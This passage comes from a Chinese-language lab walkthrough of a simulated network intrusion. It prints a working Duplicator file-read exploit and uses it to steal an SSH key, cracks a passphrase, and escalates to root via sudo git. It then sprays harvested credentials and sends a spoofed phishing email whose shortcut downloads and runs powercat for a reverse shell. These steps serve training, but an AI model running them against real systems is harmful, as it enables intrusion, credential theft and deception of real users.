`--plugins-detection aggressive`: 使用 Aggressive 模式來檢測 plugins\
`-o websrv1/wpscan`: 結果 輸出到 websrv1/wpscan 
>> duplicator 版本 1.3.26，已過時！

#### 4. 搜尋 Duplicator plugin 的漏洞
使用 searchsploit 來搜尋 Duplicator 1.3.26 的已知漏洞
```
┌──(chw㉿CHW)-[~/beyond]
└─$ searchsploit duplicator
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                           | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forg | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                     | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                    | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read     | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Me | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download          | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                   | php/webapps/50993.txt
WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Expos | php/webapps/51874.py
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forg | php/webapps/40908.html
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
>`WordPress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read | php/webapps/50420.py`\
`WordPress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb`

## Attacking a Public Machine
利用前面收集到的資訊來入侵 WEBSRV1
### Initial Foothold
#### 1. 查詢下載 exploit
查看 exploit
```
┌──(chw㉿CHW)-[~/beyond]
└─$ searchsploit -x 50420
# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
# Date: October 16, 2021
# Exploit Author: nam3lum
# Vendor Homepage: https://wordpress.org/plugins/duplicator/
# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
# Version: 1.3.26
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-11738

import requests as re
import sys

if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
        exit()

arg = sys.argv[1]
file = sys.argv[2]

URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file

output = re.get(url = URL)
print(output.text)
```
> Path Traversal

```
┌──(chw㉿CHW)-[~/beyond]
└─$ searchsploit -m 50420 
```
#### 2. 透過 exploit 利用漏洞
##### 2.1 讀取 `/etc/passwd`
```
┌──(chw㉿CHW)-[~/beyond]
└─$ python3 50420.py http://192.168.117.244 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```
> User: `daniela` 和 `marcus`

##### 2.2 嘗試讀取 SSH 私鑰 (id_rsa)
```
┌──(chw㉿CHW)-[~/beyond]
└─$ python3 50420.py http://192.168.117.244 /home/marcus/.ssh/id_rsa
Invalid installer file name!!
                                                                                                               
┌──(chw㉿CHW)-[~/beyond]
└─$ python3 50420.py http://192.168.117.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----
```
> 成功讀取 daniela 的 SSH 私鑰

#### 3. 使用 SSH 私鑰嘗試登入
```
┌──(chw㉿CHW)-[~/beyond]
└─$ echo "PRIVATE_KEY_CONTENT" > id_rsa
┌──(chw㉿CHW)-[~/beyond]
└─$  chmod 600 id_rsa          
┌──(chw㉿CHW)-[~/beyond]
└─$ ssh -i id_rsa daniela@192.168.117.244

The authenticity of host '192.168.117.244 (192.168.117.244)' can't be established.
ED25519 key fingerprint is SHA256:vhxi+CCQgvUHPEgu5nTN85QQZihXqJCE34zq/OU48VM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.117.244' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```
> SSH 私鑰受到密碼保護，需要破解密碼

#### 4. 破解 SSH 私鑰密碼
```
┌──(chw㉿CHW)-[~/beyond]
└─$ ssh2john id_rsa > ssh.hash
                       
┌──(chw㉿CHW)-[~/beyond]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:35 0.01% (ETA: 2025-03-22 23:14) 0g/s 35.26p/s 35.26c/s 35.26C/s dragons..poohbear1
tequieromucho    (id_rsa)     
1g 0:00:00:39 DONE (2025-03-17 07:05) 0.02502g/s 35.23p/s 35.23c/s 35.23C/s jesse..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   
```
SSH 登入：
```
┌──(chw㉿CHW)-[~/beyond]
└─$ ssh -i id_rsa daniela@192.168.117.244                  
Enter passphrase for key 'id_rsa': tequieromucho
...
Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
daniela@websrv1:~$ whoami
daniela
```
> 成功滲透第一台機器

>[!Note]
>記錄取得的帳號資訊\
> `echo "daniela: tequieromucho" >> creds.txt`
### A Link to the Past
目前已取得 `WEBSRV1` 的 `daniela` 使用者權限\
接著使用 linPEAS 收集資訊
#### 1. 使用 linPEAS 進行本機資訊收集
```
┌──(chw㉿CHW)-[~/beyond/websrv1]
└─$ cp /usr/share/peass/linpeas/linpeas.sh .
                                                                                                               
┌──(chw㉿CHW)-[~/beyond/websrv1]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
daniela@websrv1:~$ wget http://192.168.45.214/linpeas.sh
daniela@websrv1:~$ chmod +x ./linpeas.sh 
daniela@websrv1:~$ ./linpeas.sh
...
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                           
Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022                           
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
...
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                             
Matching Defaults entries for daniela on websrv1:                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
...
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27 11:31 /srv/www/wordpress/wp-config.php                                                                                                                          
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
...
╔══════════╣ Analyzing Github Files (limit 70)
                                                                                                                                
drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
```
> 系統: Ubuntu 22.04.1 LTS\
> `daniela` 可以不用密碼使用 `sudo git`\
> WordPress 資料庫: `wordpress`:`DanielKeyboard3311`\
> 能夠讀取 `.git`: 查看過去的變更，甚至找到敏感資訊

先將憑證存入 `creds.txt`
```
┌──(chw㉿CHW)-[~/beyond]
└─$ echo "DB_USER: wordpress, DB_PASSWORD: DanielKeyboard3311" >> creds.txt
```
#### 2. 濫用 sudo git 進行提權
查看 [GTFOBins](https://gtfobins.github.io/gtfobins/git/) 提權方法：
```
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
sudo: sorry, you are not allowed to set the following environment variables: PAGER
```
> 這個方法被系統封鎖

嘗試第二種方法：`sudo git`
```
daniela@websrv1:~$ sudo git -p help config
...
       •   no section or name was provided (ret=2),

       •   the config file is invalid (ret=3),

!/bin/bash

root@websrv1:/home/daniela# whoami
root
```
> 呼叫 execute code，再使用 ! + Command\
> 成功對 `WEBSRV1` 提權

#### 3. 使用 `.git` 尋找敏感資訊
```
root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean
root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit

```
> 查看 `612ff5783cc5dbd1e0e008523dba83374a84aaf1`: Removed staging script and internal network access

```
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```
> `john`:`dqsTwTpZPn#nL` IP: `192.168.50.245`

#### 4. 記錄新獲得的憑證
```
┌──(chw㉿CHW)-[~/beyond]
└─$ echo "john: dqsTwTpZPn#nL (192.168.50.245)" >> creds.txt
```
## Gaining Access to the Internal Network
### Domain Credentials
#### 1. 確認現有的憑證
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cat creds.txt    
daniela: tequieromucho
DB_USER: wordpress, DB_PASSWORD: DanielKeyboard3311
john: dqsTwTpZPn#nL (192.168.50.245)

```
> 已發現的使用者: `marcus`, `daniela`, `john`

建立測試帳號與密碼列表:
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cat usernames.txt 
marcus
john
daniela

┌──(chw㉿CHW)-[~/beyond]
└─$ cat passwords.txt      
tequieromucho
DanielKeyboard3311
dqsTwTpZPn#nL
```
#### 2. CrackMapExec 測試帳密組合
使用 CrackMapExec 測試這些帳密是否能登入 MAILSRV1 (透過 SMB 協議)
```
┌──(chw㉿CHW)-[~/beyond]
└─$ crackmapexec smb 192.168.117.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.117.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.117.242 445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE
```
> `john`:`dqsTwTpZPn#nL` 登入 `MAILSRV1`\
> 且確認 MAILSRV1 加入 `beyond.com` 網域，在內網的一部分

#### 3. 列舉 `MAILSRV1` 的 SMB 資料夾
john 的帳密有效，嘗試列舉 `MAILSRV1` 共享的資料夾
```
┌──(chw㉿CHW)-[~/beyond]
└─$ crackmapexec smb 192.168.117.242 -u john -p "dqsTwTpZPn#nL" --shares
SMB         192.168.117.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.117.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.117.242 445    MAILSRV1         [+] Enumerated shares
SMB         192.168.117.242 445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.117.242 445    MAILSRV1         -----           -----------     ------
SMB         192.168.117.242 445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.117.242 445    MAILSRV1         C$                              Default share
SMB         192.168.117.242 445    MAILSRV1         IPC$            READ            Remote IPC

``` 
> 沒有可讀取的共享資料夾

### Phishing for Access
無法透過 MAILSRV1 直接進入內部網路，可以選擇 Client-Side Attack
常見的 客戶端攻擊方式 ：\
- 透過 Microsoft Office 文件中的巨集 (Macro) 來執行惡意程式
- 使用 Windows Library (.Library-ms) + 快捷方式 (.lnk) 執行惡意命令

#### 1. 建立 WebDAV Server
提供一個遠端共享來儲存 `.Library-ms` 檔案，導致內部使用者點擊 `.lnk` 時，系統會從 WebDAV 伺服器下載惡意指令
```
┌──(chw㉿CHW)-[~/beyond]
└─$ mkdir webdav 
┌──(chw㉿CHW)-[~/beyond]
└─$ pip3 install --user wsgidav
┌──(chw㉿CHW)-[~/beyond]
└─$ /home/chw/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/chw/beyond/webdav/
Running without configuration file.
09:41:20.250 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
09:41:20.251 - INFO    : WsgiDAV/4.3.3 Python/3.11.9 Linux-6.8.11-arm64-aarch64-with-glibc2.38
09:41:20.251 - INFO    : Lock manager:      LockManager(LockStorageDict)
09:41:20.251 - INFO    : Property manager:  None
09:41:20.251 - INFO    : Domain controller: SimpleDomainController()
09:41:20.251 - INFO    : Registered DAV providers by route:
09:41:20.251 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/chw/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
09:41:20.251 - INFO    :   - '/': FilesystemProvider for path '/home/chw/beyond/webdav' (Read-Write) (anonymous)
09:41:20.251 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
09:41:20.251 - WARNING : Share '/' will allow anonymous write access.
09:41:20.251 - WARNING : Share '/:dir_browser' will allow anonymous write access.
09:41:20.269 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.0 Python/3.11.9
09:41:20.269 - INFO    : Serving on http://0.0.0.0:80 ...
```
> 成功啟動 WebDAV 伺服器，提供匿名讀取/寫入權限

#### 2. 建立 Windows Library (.Library-ms) 檔案
登入 RDP (192.168.117.250)，建立 Windows Library 和 shortcut files
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp  /u:offsec  /p:lab /v:192.168.117.250
```
![image](https://hackmd.io/_uploads/rJPUKewh1g.png)\
建立 Library 文件 (`config.Library-ms`)
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.214</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
![image](https://hackmd.io/_uploads/HJxt-bP31g.png)


`.Library-ms` 檔案會讓 Windows 嘗試存取 WebDAV 伺服器\
接著將 `.Library-ms` 傳回 Kali
```
PS C:\Users\offsec\Desktop> scp config.Library-ms chw@192.168.45.214:/home/chw/beyond/
chw@192.168.45.214's password:
config.Library-ms
```

#### 3. 建立惡意 `.lnk` shortcut files
建立捷徑：\
![image](https://hackmd.io/_uploads/HJyB5lv3Jx.png)
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.214:8000/powercat.ps1'); powercat -c 192.168.45.214 -p 8888 -e powershell"
```
> - 從 Kali 伺服器 (http://192.168.45.214:8000) 下載 `powercat.ps1`\
> - 使用 PowerCat 建立反向 Shell (nc -nvlp 8888)\
> - 回連到 Kali 機器 (192.168.45.214:8888)

![image](https://hackmd.io/_uploads/rJ6dcxPnJe.png)\
接著傳回 WebDav\
![image](https://hackmd.io/_uploads/r15EfZP2ke.png)


#### 4. 設定 PowerCat Server
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

┌──(chw㉿CHW)-[~/beyond]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
#### 5. 啟動 Netcat 監聽
```
┌──(chw㉿CHW)-[~/beyond]
└─$ nc -nvlp 8888
listening on [any] 8888 ..
```
#### 6. 發送釣魚郵件
在 `/beyond/webdav` 建立 body.tx
```                                   
┌──(chw㉿CHW)-[~/beyond/webdav]
└─$ cat body.txt        
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```
> 偽裝成內部 IT 人員，誘導受害者開啟 `.Library-ms` 檔案

使用 `swaks` 送出釣魚郵件
```
┌──(chw㉿CHW)-[~/beyond/webdav]
└─$ ls
body.txt  config.Library-ms  powershell.lnk
       
┌──(chw㉿CHW)-[~/beyond/webdav]
└─$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.117.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
[sudo] password for chw: 
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.117.242:25...
=== Connected to 192.168.117.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO CHW.CHW
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 72 lines sent
<-  250 Queued (13.172 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```
> `-t daniela@beyond.com -t marcus@beyond.com`: 收件人給 daniela 和 marcus\
`--from john@beyond.com`: 寄件人偽造 john@beyond.com\
`--attach @config.Library-ms`: 附件 `config.Library-ms`\
`--server 192.168.117.242`: 指定 SMTP 伺服器 (MAILSRV1)\
`--body @body.txt`:郵件內容\
`--header "Subject: Staging Script"`: 郵件標題（"Staging Script"）\
`--suppress-data`: 隱藏郵件內容細節，只顯示 SMTP 結果\
`-ap`: 啟用身份驗證
>> 成功送出

#### 7. 成功獲得內部網路存取
```
┌──(chw㉿CHW)-[~/beyond]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.117.242 - - [18/Mar/2025 10:27:07] "GET /powercat.ps1 HTTP/1.1" 200 -

```
```
┌──(chw㉿CHW)-[~/beyond]
└─$ nc -nvlp 8888
listening on [any] 8888 ...

connect to [192.168.45.214] from (UNKNOWN) [192.168.117.242] 62505
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus
PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1
PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.73.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.73.254
PS C:\Windows\System32\WindowsPowerShell\v1.0> 
```

## Enumerating the Internal Network
- 蒐集內部網路的資訊
- 枚舉 AD 環境，尋找用戶、電腦、網域管理員等資訊
### Situational Awareness
前已經成功取得 CLIENTWK1 的反向 Shell
#### 1. 取得 CLIENTWK1 的基本資訊
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cp /home/chw/winPEASx64.exe .
┌──(chw㉿CHW)-[~/beyond]
└─$ python3 -m http.server 8000
```
```
PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/winPEASx64.exe -Outfile winPEAS.exe                 
iwr -uri http://192.168.45.214:8000/winPEASx64.exe -Outfile winPEAS.exe
PS C:\Users\marcus>.\winPEAS.exe
...
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Pro
    EditionID: Professional
...
AV Information:
No AV was detected!!
...
����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:AB:26:41]: 172.16.73.243 / 255.255.255.0
        Gateways: 172.16.73.254
        DNSs: 172.16.73.240
        Known hosts:
          172.16.73.240         00-50-56-AB-13-3B     Dynamic
          172.16.73.254         00-50-56-AB-A8-17     Dynamic
          172.16.73.255         FF-FF-FF-FF-FF-FF     Static

...

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.73.254
                  
PS C:\Users\marcus> systeminfo
Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
...
```
> 1. CLIENTWK1 屬於 beyond.com 網域，並運行 Windows 10 Pro (實際上是 Windows 11)
> 2. 沒有偵測到防毒軟體，表示可以任意執行惡意工具
> 3. `172.16.73.240` : 可能是 DC (DCSRV1)
> 4. `172.16.73.254 `: `MAILSRV1` 內部 IP (之前從外部連線時是 192.168.117.242，表示雙網卡設備)

紀錄這些資訊
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cat computer.txt             
172.16.73.240 - DCSRV1.BEYOND.COM  # 可能是網域控制器
172.16.73.254 - MAILSRV1.BEYOND.COM  # 內部郵件伺服器，雙網卡設備
172.16.73.243 - CLIENTWK1.BEYOND.COM  # 目前我們入侵的電腦
```
#### 2. Active Directory 枚舉
使用 BloodHound 掃描 網域內的用戶、電腦和管理員。
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```
```
